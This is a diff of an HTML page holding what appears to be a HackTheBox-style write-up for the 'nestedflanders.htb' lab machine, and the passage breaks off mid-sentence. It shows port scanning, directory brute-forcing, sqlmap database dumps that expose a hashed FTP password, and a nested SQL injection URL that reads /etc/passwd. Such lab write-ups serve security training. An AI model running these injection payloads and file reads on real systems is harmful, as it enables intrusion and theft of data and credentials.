@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.78.1" />
+<meta name="generator" content="Hugo 0.91.2" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -313,205 +313,213 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.126
-
-Running command: sudo masscan -e tun0 -p1-65535,U:1-65535 --max-rate 500 --interactive 10.10.10.126
-
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-23 15:11:16 GMT
- -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [131070 ports/host]
-Discovered open port 443/tcp on 10.10.10.126                                   
-Discovered open port 80/tcp on 10.10.10.126                                    
-
-Running command: sudo nmap -A -p80,443 10.10.10.126
-Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 18:17 EEST
-Nmap scan report for www.nestedflanders.htb (10.10.10.126)
-Host is up (0.075s latency).
-
-PORT    STATE SERVICE  VERSION
-80/tcp  open  http     nginx 1.10.3
-|_http-server-header: nginx/1.10.3
-|_http-title: Did not follow redirect to https://www.nestedflanders.htb
-443/tcp open  ssl/http nginx 1.10.3
-|_http-server-header: nginx/1.10.3
-|_http-title: Apache2 Debian Default Page: It works
-| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
-| Not valid before: 2018-12-19T09:43:58
-|_Not valid after:  2021-09-13T09:43:58
-Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 4.8 (91%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo htbscan.py 10.10.10.126
+<span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo masscan -e tun0 -p1-65535,U:1-65535 --max-rate 500 --interactive 10.10.10.126
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-08-23 15:11:16 GMT
+</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span><span class="go">Initiating SYN Stealth Scan
+</span><span class="go">Scanning 1 hosts [131070 ports/host]
+</span><span class="go">Discovered open port 443/tcp on 10.10.10.126                                   
+</span><span class="go">Discovered open port 80/tcp on 10.10.10.126                                    
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Running command: sudo nmap -A -p80,443 10.10.10.126
+</span><span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-23 18:17 EEST
+</span><span class="go">Nmap scan report for www.nestedflanders.htb (10.10.10.126)
+</span><span class="go">Host is up (0.075s latency).
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">PORT    STATE SERVICE  VERSION
+</span><span class="go">80/tcp  open  http     nginx 1.10.3
+</span><span class="go">|_http-server-header: nginx/1.10.3
+</span><span class="go">|_http-title: Did not follow redirect to https://www.nestedflanders.htb
+</span><span class="go">443/tcp open  ssl/http nginx 1.10.3
+</span><span class="go">|_http-server-header: nginx/1.10.3
+</span><span class="go">|_http-title: Apache2 Debian Default Page: It works
+</span><span class="go">| ssl-cert: Subject: commonName=www.nestedflanders.htb/organizationName=Unattended ltd/stateOrProvinceName=IT/countryName=IT
+</span><span class="go">| Not valid before: 2018-12-19T09:43:58
+</span><span class="go">|_Not valid after:  2021-09-13T09:43:58
+</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span><span class="go">Aggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 - 4.6 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%), Linux 4.4 (91%), Linux 4.8 (91%)
+</span><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></code></pre></div></div>
 
 <p>We observe that port 80 redirects to <a href="https://www.nestedflanders.htb" target="_blank">https://www.nestedflanders.htb</a> and the commonName of the SSL certificate is also the same. Therefore, we add the following line in our /etc/hosts file:</p>
-<pre><code>10.10.10.126 www.nestedflanders.htb</code></pre>
+<pre tabindex="0"><code>10.10.10.126 www.nestedflanders.htb</code></pre>
 <h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>
 
 <p>Now, let&rsquo;s brute-force directories and files using gobuster:</p>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gobuster -k -u https://www.nestedflanders.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -t 20 -x php
-
-=====================================================
-Gobuster v2.0.1              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : https://www.nestedflanders.htb/
-[+] Threads      : 20
-[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Extensions   : php
-[+] Timeout      : 10s
-=====================================================
-2019/04/30 01:20:35 Starting gobuster
-=====================================================
-/index.php (Status: 200)
-/dev (Status: 301)</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>gobuster -k -u https://www.nestedflanders.htb -w /opt/DirBuster/directory-list-2.3-medium.txt -t <span class="m">20</span> -x php
+<span class="err">
+</span><span class="err"></span><span class="go">=====================================================
+</span><span class="go">Gobuster v2.0.1              OJ Reeves (@TheColonial)
+</span><span class="go">=====================================================
+</span><span class="go">[+] Mode         : dir
+</span><span class="go">[+] Url/Domain   : https://www.nestedflanders.htb/
+</span><span class="go">[+] Threads      : 20
+</span><span class="go">[+] Wordlist     : /opt/DirBuster/directory-list-2.3-medium.txt
+</span><span class="go">[+] Status codes : 200,204,301,302,307,403
+</span><span class="go">[+] Extensions   : php
+</span><span class="go">[+] Timeout      : 10s
+</span><span class="go">=====================================================
+</span><span class="go">2019/04/30 01:20:35 Starting gobuster
+</span><span class="go">=====================================================
+</span><span class="go">/index.php (Status: 200)
+</span><span class="go">/dev (Status: 301)
+</span></code></pre></div></div>
 
 <h1 id="exploitation">Exploitation</h1>
 
 <h2 id="sql-injection">SQL Injection</h2>
 
 <p>If we visit <a href="https://www.nestedflanders.htb/index.php" target="_blank">https://www.nestedflanders.htb/index.php</a>, we see some interesting links of this pattern: <strong>index.php?id=</strong>
-<div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=25&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>main<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=465&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=587&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=25&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>main<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=465&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>about<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&#34;col-md-2&#34;</span><span class="p">&gt;&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#34;index.php?id=587&#34;</span> <span class="na">target</span><span class="o">=</span><span class="s">&#34;maifreim&#34;</span><span class="p">&gt;</span>contact<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span></code></pre></div></p>
 
 <p>Let&rsquo;s run sqlmap to test for SQL injections:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10
-
-...
-[18:49:08] [INFO] GET parameter &#39;id&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;Feel&#34;)
-...
-[18:49:24] [INFO] GET parameter &#39;id&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
-...
-sqlmap identified the following injection point(s) with a total of 501 HTTP(s) requests:
----
-Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=465&#39; AND 5708=5708-- sdGB
-
-    Type: time-based blind
-    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=465&#39; AND (SELECT 2816 FROM (SELECT(SLEEP(5)))iVnX)-- orQO
----
-[18:51:13] [INFO] the back-end DBMS is MySQL
-back-end DBMS: MySQL &gt;= 5.0.12</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span>
+<span class="err">
+</span><span class="err"></span><span class="go">...
+</span><span class="go">[18:49:08] [INFO] GET parameter &#39;id&#39; appears to be &#39;AND boolean-based blind - WHERE or HAVING clause&#39; injectable (with --string=&#34;Feel&#34;)
+</span><span class="go">...
+</span><span class="go">[18:49:24] [INFO] GET parameter &#39;id&#39; appears to be &#39;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#39; injectable 
+</span><span class="go">...
+</span><span class="go">sqlmap identified the following injection point(s) with a total of 501 HTTP(s) requests:
+</span><span class="go">---
+</span><span class="go">Parameter: id (GET)
+</span><span class="go">    Type: boolean-based blind
+</span><span class="go">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span><span class="go">    Payload: id=465&#39; AND 5708=5708-- sdGB
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">    Type: time-based blind
+</span><span class="go">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+</span><span class="go">    Payload: id=465&#39; AND (SELECT 2816 FROM (SELECT(SLEEP(5)))iVnX)-- orQO
+</span><span class="go">---
+</span><span class="go">[18:51:13] [INFO] the back-end DBMS is MySQL
+</span><span class="go">back-end DBMS: MySQL &gt;= 5.0.12
+</span></code></pre></div></div></p>
 
 <p>Let&rsquo;s see what databases we have:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 --dbs
-
-available databases [2]:
-[*] information_schema
-[*] neddy</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> --dbs
+<span class="err">
+</span><span class="err"></span><span class="go">available databases [2]:
+</span><span class="go">[*] information_schema
+</span><span class="go">[*] neddy
+</span></code></pre></div></div></p>
 
 <p>Let&rsquo;s see what tables the database &lsquo;neddy&rsquo; have:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy --tables
-
-Database: neddy
-[11 tables]
-+--------------+
-| config       |
-| customers    |
-| employees    |
-| filepath     |
-| idname       |
-| offices      |
-| orderdetails |
-| orders       |
-| payments     |
-| productlines |
-| products     |
-+--------------+</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy --tables
+<span class="err">
+</span><span class="err"></span><span class="go">Database: neddy
+</span><span class="go">[11 tables]
+</span><span class="go">+--------------+
+</span><span class="go">| config       |
+</span><span class="go">| customers    |
+</span><span class="go">| employees    |
+</span><span class="go">| filepath     |
+</span><span class="go">| idname       |
+</span><span class="go">| offices      |
+</span><span class="go">| orderdetails |
+</span><span class="go">| orders       |
+</span><span class="go">| payments     |
+</span><span class="go">| productlines |
+</span><span class="go">| products     |
+</span><span class="go">+--------------+
+</span></code></pre></div></div></p>
 
 <p>Well, three databases look very promising (&lsquo;config&rsquo;, &lsquo;filepath&rsquo;, &lsquo;idname&rsquo;). Let&rsquo;s dump and examine them:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T config --dump
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T config --dump
+<span class="err">
+</span><span class="err"></span><span class="go">Database: neddy
+</span><span class="go">Table: config
+</span><span class="go">[52 entries]
+</span><span class="go">+-----+-------------------------+----------------------------------------------+
+</span><span class="go">| id  | option_name             | option_value                                 |
+</span><span class="go">+-----+-------------------------+----------------------------------------------+
+</span><span class="go">| 54  | offline                 | 0                                            |
+</span><span class="go">| 55  | offline_message         | Site offline, please come back later         |
+</span><span class="go">| 56  | display_offline_message | 0                                            |
+</span><span class="go">| 57  | offline_image           | &lt;blank&gt;                                      |
+</span><span class="go">| 58  | sitename                | NestedFlanders                               |
+</span><span class="go">| 59  | editor                  | tinymce                                      |
+</span><span class="go">| 60  | captcha                 | 0                                            |
+</span><span class="go">| 61  | list_limit              | 20                                           |
+</span><span class="go">| 62  | access                  | 1                                            |
+</span><span class="go">| 63  | debug                   | 0                                            |
+</span><span class="go">| 64  | debug_lang              | 0                                            |
+</span><span class="go">| 65  | dbtype                  | mysqli                                       |
+</span><span class="go">| 66  | host                    | localhost                                    |
+</span><span class="go">| 67  | live_site               | &lt;blank&gt;                                      |
+</span><span class="go">| 68  | gzip                    | 0                                            |
+</span><span class="go">| 69  | error_reporting         | default                                      |
+</span><span class="go">| 70  | ftp_host                | 127.0.0.1                                    |
+</span><span class="go">| 71  | ftp_port                | 21                                           |
+</span><span class="go">| 72  | ftp_user                | flanders                                     | 
+</span><span class="go">| 73  | ftp_pass                | 0e1aff658d8614fd0eac675b...287a94ffcde451466 |
+</span><span class="go">| 74  | ftp_root                | /                                            |
+</span><span class="go">| 75  | ftp_enable              | 1                                            |
+</span><span class="go">| 76  | offset                  | UTC                                          |
+</span><span class="go">| 77  | mailonline              | 1                                            |
+</span><span class="go">| 78  | mailer                  | mail                                         |
+</span><span class="go">| 79  | mailfrom                | nested@nestedflanders.htb                    |
+</span><span class="go">| 80  | fromname                | Neddy                                        |
+</span><span class="go">| 81  | sendmail                | /usr/sbin/sendmail                           |
+</span><span class="go">| 82  | smtpauth                | 0                                            |
+</span><span class="go">| 83  | smtpuser                | &lt;blank&gt;                                      |
+</span><span class="go">| 84  | smtppass                | &lt;blank&gt;                                      |
+</span><span class="go">| 85  | smtppass                | &lt;blank&gt;                                      |
+</span><span class="go">| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
+</span><span class="go">| 87  | smtphost                | localhost                                    |
+</span><span class="go">| 88  | smtpsecure              | none                                         |
+</span><span class="go">| 89  | smtpport                | 25                                           |
+</span><span class="go">| 90  | caching                 | 0                                            |
+</span><span class="go">| 91  | cache_handler           | file                                         |
+</span><span class="go">| 92  | cachetime               | 15                                           |
+</span><span class="go">| 93  | MetaDesc                | &lt;blank&gt;                                      |
+</span><span class="go">| 94  | MetaKeys                | &lt;blank&gt;                                      |
+</span><span class="go">| 95  | MetaTitle               | 1                                            |
+</span><span class="go">| 96  | MetaAuthor              | 1                                            |
+</span><span class="go">| 97  | MetaVersion             | 0                                            |
+</span><span class="go">| 98  | robots                  | &lt;blank&gt;                                      |
+</span><span class="go">| 99  | sef                     | 1                                            |
+</span><span class="go">| 100 | sef_rewrite             | 0                                            |
+</span><span class="go">| 101 | sef_suffix              | 0                                            |
+</span><span class="go">| 102 | unicodeslugs            | 0                                            |
+</span><span class="go">| 103 | feed_limit              | 10                                           |
+</span><span class="go">| 104 | lifetime                | 1                                            |
+</span><span class="go">| 105 | session_handler         | file                                         |
+</span><span class="go">+-----+-------------------------+----------------------------------------------+
+</span></code></pre></div></div></p>
 
-Database: neddy
-Table: config
-[52 entries]
-+-----+-------------------------+----------------------------------------------+
-| id  | option_name             | option_value                                 |
-+-----+-------------------------+----------------------------------------------+
-| 54  | offline                 | 0                                            |
-| 55  | offline_message         | Site offline, please come back later         |
-| 56  | display_offline_message | 0                                            |
-| 57  | offline_image           | &lt;blank&gt;                                      |
-| 58  | sitename                | NestedFlanders                               |
-| 59  | editor                  | tinymce                                      |
-| 60  | captcha                 | 0                                            |
-| 61  | list_limit              | 20                                           |
-| 62  | access                  | 1                                            |
-| 63  | debug                   | 0                                            |
-| 64  | debug_lang              | 0                                            |
-| 65  | dbtype                  | mysqli                                       |
-| 66  | host                    | localhost                                    |
-| 67  | live_site               | &lt;blank&gt;                                      |
-| 68  | gzip                    | 0                                            |
-| 69  | error_reporting         | default                                      |
-| 70  | ftp_host                | 127.0.0.1                                    |
-| 71  | ftp_port                | 21                                           |
-| 72  | ftp_user                | flanders                                     | 
-| 73  | ftp_pass                | 0e1aff658d8614fd0eac675b...287a94ffcde451466 |
-| 74  | ftp_root                | /                                            |
-| 75  | ftp_enable              | 1                                            |
-| 76  | offset                  | UTC                                          |
-| 77  | mailonline              | 1                                            |
-| 78  | mailer                  | mail                                         |
-| 79  | mailfrom                | nested@nestedflanders.htb                    |
-| 80  | fromname                | Neddy                                        |
-| 81  | sendmail                | /usr/sbin/sendmail                           |
-| 82  | smtpauth                | 0                                            |
-| 83  | smtpuser                | &lt;blank&gt;                                      |
-| 84  | smtppass                | &lt;blank&gt;                                      |
-| 85  | smtppass                | &lt;blank&gt;                                      |
-| 86  | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;
-| 87  | smtphost                | localhost                                    |
-| 88  | smtpsecure              | none                                         |
-| 89  | smtpport                | 25                                           |
-| 90  | caching                 | 0                                            |
-| 91  | cache_handler           | file                                         |
-| 92  | cachetime               | 15                                           |
-| 93  | MetaDesc                | &lt;blank&gt;                                      |
-| 94  | MetaKeys                | &lt;blank&gt;                                      |
-| 95  | MetaTitle               | 1                                            |
-| 96  | MetaAuthor              | 1                                            |
-| 97  | MetaVersion             | 0                                            |
-| 98  | robots                  | &lt;blank&gt;                                      |
-| 99  | sef                     | 1                                            |
-| 100 | sef_rewrite             | 0                                            |
-| 101 | sef_suffix              | 0                                            |
-| 102 | unicodeslugs            | 0                                            |
-| 103 | feed_limit              | 10                                           |
-| 104 | lifetime                | 1                                            |
-| 105 | session_handler         | file                                         |
-+-----+-------------------------+----------------------------------------------+</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T filepath --dump
+<span class="err">
+</span><span class="err"></span><span class="go">Database: neddy
+</span><span class="go">Table: filepath
+</span><span class="go">[3 entries]
+</span><span class="go">+---------+--------------------------------------+
+</span><span class="go">| name    | path                                 |
+</span><span class="go">+---------+--------------------------------------+
+</span><span class="go">| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
+</span><span class="go">| contact | 0f710bba8d16303a415266af8bb52fcb.php |
+</span><span class="go">| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
+</span><span class="go">+---------+--------------------------------------+
+</span></code></pre></div></div>
 
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T filepath --dump
-
-Database: neddy
-Table: filepath
-[3 entries]
-+---------+--------------------------------------+
-| name    | path                                 |
-+---------+--------------------------------------+
-| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |
-| contact | 0f710bba8d16303a415266af8bb52fcb.php |
-| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |
-+---------+--------------------------------------+</code></pre></div>
-
-<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;https://www.nestedflanders.htb/index.php?id=465&#34; --method=GET -p id --level=5 --risk=3 --dbms=MySQL --threads 10 -D neddy -T idname --dump
-Database: neddy
-Table: idname
-[6 entries]
-+-----+-------------+----------+
-| id  | name        | disabled |
-+-----+-------------+----------+
-| 1   | main.php    | 1        |
-| 2   | about.php   | 1        |
-| 3   | contact.php | 1        |
-| 25  | main        | 0        |
-| 465 | about       | 0        |
-| 587 | contact     | 0        |
-+-----+-------------+----------+</code></pre></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sqlmap -u <span class="s2">&#34;https://www.nestedflanders.htb/index.php?id=465&#34;</span> --method<span class="o">=</span>GET -p id --level<span class="o">=</span><span class="m">5</span> --risk<span class="o">=</span><span class="m">3</span> --dbms<span class="o">=</span>MySQL --threads <span class="m">10</span> -D neddy -T idname --dump
+<span class="go">Database: neddy
+</span><span class="go">Table: idname
+</span><span class="go">[6 entries]
+</span><span class="go">+-----+-------------+----------+
+</span><span class="go">| id  | name        | disabled |
+</span><span class="go">+-----+-------------+----------+
+</span><span class="go">| 1   | main.php    | 1        |
+</span><span class="go">| 2   | about.php   | 1        |
+</span><span class="go">| 3   | contact.php | 1        |
+</span><span class="go">| 25  | main        | 0        |
+</span><span class="go">| 465 | about       | 0        |
+</span><span class="go">| 587 | contact     | 0        |
+</span><span class="go">+-----+-------------+----------+
+</span></code></pre></div></div>
 
 <p>What do we have here?</p>
 
@@ -525,7 +533,7 @@ php files defined in the column &lsquo;path&rsquo; of the table &lsquo;filepath&
 <p>Indeed if we hit, for example, this url <a href="https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php" target="_blank">https://www.nestedflanders.htb/47c1ba4f7b1edf28ea0e2bb250717093.php</a> we confirm
 that we get the &lsquo;about&rsquo; page. In other words, we must have a query, similar to this,
 running on the backend:</p>
-<pre><code>SELECT path FROM neddy.filepath WHERE name=(SELECT name FROM neddy.idname WHERE
+<pre tabindex="0"><code>SELECT path FROM neddy.filepath WHERE name=(SELECT name FROM neddy.idname WHERE
 id=&#39;587&#39;)</code></pre>
 <p>Note the nested query (also known as inner query or subquery). Now, what if
 there is another SQL injection in the outer query? Could we exploit it using a
@@ -535,18 +543,18 @@ nested SQL injection in the inner query? Let&rsquo;s find out.</p>
 
 <p>First, let&rsquo;s explore again the initial SQL injection, manually this time.
 If we use &lsquo;ORDER BY 1&rsquo;, we get the contact page normally:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 1 --+</code></pre>
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 1 --+</code></pre>
 <p>But if we use &lsquo;ORDER BY 2&rsquo;, the query results in error and the default index page is showed to us:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 2 --+</code></pre>
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; ORDER BY 2 --+</code></pre>
 <p>Now, let&rsquo;s get things interesting. The inner query should return a name like
 &lsquo;contact&rsquo;. What if we replace &lsquo;contact&rsquo; with &lsquo;about&rsquo;:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#34; --+</code></pre>
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#34; --+</code></pre>
 <p>It worked! We got the about page instead of the contact page.</p>
 
 <p>The outer query should return the path of the php file to be loaded. Let&rsquo;s try
 the same trick. We have to nest our 2nd SQL injection <code>(about' UNION SELECT
 '/etc/passwd' --+)</code> like this:</p>
-<pre><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/etc/passwd&#39; --+&#34; --+
+<pre tabindex="0"><code>https://www.nestedflanders.htb/index.php?id=587&#39; UNION SELECT &#34;about&#39; UNION SELECT &#39;/etc/passwd&#39; --+&#34; --+
 
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/bin/bash backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:109::/var/run/dbus:/bin/false sshd:x:106:65534::/run/sshd:/usr/sbin/nologin guly:x:1000:1000:guly,,,:/home/guly:/bin/bash mysql:x:107:112:MySQL Server,,,:/nonexistent:/bin/false</code></pre>
 <p>Hooray, hooray, it&rsquo;s a holiday!</p>
@@ -556,14 +564,15 @@ want to see the source code of php files, we have to use some kind of filter
 conversion (e.g. <code>php://filter/read=convert.base64-encode/resource=</code>) because,
 otherwise, it will load/run the php files. Let&rsquo;s
